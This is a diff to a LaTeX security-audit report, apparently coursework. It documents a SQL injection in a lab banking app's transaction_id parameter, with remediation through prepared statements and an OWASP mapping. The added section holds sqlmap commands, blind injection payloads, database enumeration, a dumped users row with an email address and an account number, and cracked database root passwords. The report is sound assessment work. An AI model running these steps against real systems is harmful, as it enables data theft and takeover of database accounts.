@@ -15,11 +15,117 @@ Impact:      	high\newline
 Risk: high \newline
 
 \section{Discovery}
-This vulnerability was discovered by the tool sqlmap. 
-\begin{enumerate}
-\item \textit{sqlmap -u "host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=x"}
-\end{enumerate}
+This vulnerability was discovered by the tool sqlmap. The result of the first Test in Listing \ref{listing:first_test} shows that GET-Parameter is vulnerable.
 
+
+
+\begin{lstlisting}[caption= First Test with result,label=listing:first_test]
+sqlmap -u "host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=14"
+
+.....
+
+GET parameter 'transaction_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection points with a total of 202 HTTP(s) requests:
+---
+Place: GET
+Parameter: transaction_id
+Type: boolean-based blind
+Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
+Payload: transaction_id=14' RLIKE (SELECT (CASE WHEN (6290=6290) THEN 14 ELSE 0x28 END)) AND 'umTL'='umTL
+
+Type: AND/OR time-based blind
+Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+Payload: transaction_id=14' AND 5296=BENCHMARK(5000000,MD5(0x46744978)) AND 'knKI'='knKI
+---
+\end{lstlisting}
+
+The next step was to get the name of the database and the tables, as done in Listing \ref{sqlmap-get-tables}
+
+\begin{lstlisting}[caption = Get name and tables of database,label=sqlmap-get-tables]
+python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dbs
+...
+available databases [10]:
+[*] banking_development
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] owasp10
+[*] performance_schema
+[*] phpmyadmin
+[*] samurai_dojo_basic
+[*] samurai_dojo_scavenger
+[*] test
+
+
+python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --tables -D banking_development
+
+Database: banking_development
+[5 tables]
++--------------+
+| payments     |
+| phinxlog     |
+| tan_numbers  |
+| transactions |
+| users        |
++--------------+
+\end{lstlisting}
+
+Now you can dump a table, e.g "users"
+
+\begin{lstlisting}[caption= Dump Table "users", label=listing:dump_table]
+	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dump -D banking_development -T users
+	...
+	[15:14:07] [INFO] retrieved: id
+	[15:14:07] [INFO] retrieved: name
+	[15:14:08] [INFO] retrieved: password
+	[15:14:09] [INFO] retrieved: email
+	[15:14:10] [INFO] retrieved: admin
+	[15:14:11] [INFO] retrieved: account_no
+	...
+	[15:14:14] [INFO] retrieved: 1
+	[15:14:14] [INFO] retrieved: t.srivishnu@gmail.com
+	[15:14:17] [INFO] retrieved: 1
+	[15:14:17] [INFO] retrieved: t.srivishnu@gmail.com
+	[15:14:19] [INFO] retrieved: 1234567890
+	[15:14:20] [INFO] retrieved: 527652613432
+	
+\end{lstlisting}
+
+As you can see in Listing \ref{listing:dump_table} sqlmap-get-tables  you receive a list of the columns of the table. You also get a list of all entries. For this example only the data of the admin were chosen, but you can access every entry.
+ \newline
+ \newline
+A further possibillity is to break the authentication of the database by hijacking the password of the database root user.
+
+\begin{lstlisting}[caption=Get password of database root user,label=listing:database_get_password]
+	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --users --passwords -D banking_development 
+	...
+	database management system users [8]:
+	[*] ''@'localhost'
+	[*] ''@'samurai-wtf'
+	[*] 'debian-sys-maint'@'localhost'
+	[*] 'phpmyadmin'@'localhost'
+	[*] 'root'@'127.0.0.1'
+	[*] 'root'@'::1'
+	[*] 'root'@'localhost'
+	[*] 'root'@'samurai-wtf'
+	...
+	database management system users password hashes:                                               
+	[*]  [1]:
+	password hash: NULL
+	[*] debian-sys-maint [1]:
+	password hash: *3380A3DC27DEAC2CFFE40754FE91863CE3B5E786
+	[*] phpmyadmin [1]:
+	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
+	clear-text password: samurai
+	[*] root [2]:
+	password hash: *7D9A6BEA19329B17998DC4F1130F8E40884A227F
+	clear-text password: badass
+	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
+	clear-text password: samurai
+	
+\end{lstlisting}
+
+With a integrated dictionary-based password cracking tool, you can convert the hashed password to plain text assuming weak passwords (like in our case). Now you can access adminer web-interface and login as root.
 
 
 \section{Likelihood}
@@ -38,3 +144,5 @@ This objects will automatically sanitized all inputs. For more information, plea
 
 This observation is related to OWASP Top 10-A1-Injections
 
+\section{Comparison with our App}
+We avoided MySQL-Incetion by using Prepared Statements. Therefore the user inputs are sanitized and injections like shown above are not possible.
